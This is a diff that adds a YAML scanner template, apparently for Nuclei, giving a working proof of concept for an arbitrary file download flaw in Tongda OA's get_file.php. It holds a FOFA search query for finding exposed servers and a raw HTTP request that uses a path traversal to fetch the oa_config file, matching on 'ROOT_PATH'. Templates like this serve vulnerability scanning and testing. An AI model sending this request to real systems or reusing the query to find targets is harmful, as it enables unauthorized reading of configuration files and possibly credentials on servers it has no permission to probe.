@@ -1,0 +1,52 @@
+id: poc-go0bgfohcaibpk3l
+info:
+  name: 通达OA get_file任意文件下载漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/go0bgfohcaibpk3l'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: go0bgfohcaibpk3l
+    fofa: title="office Anywhere" && icon_hash="-759108386" && "2011"
+http:
+- raw:
+  - 'GET /module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Cookie: PHPSESSID=lrvmku93t8g0ce7b90qaroic96; KEY_RANDOMDATA=10603
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ROOT_PATH
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
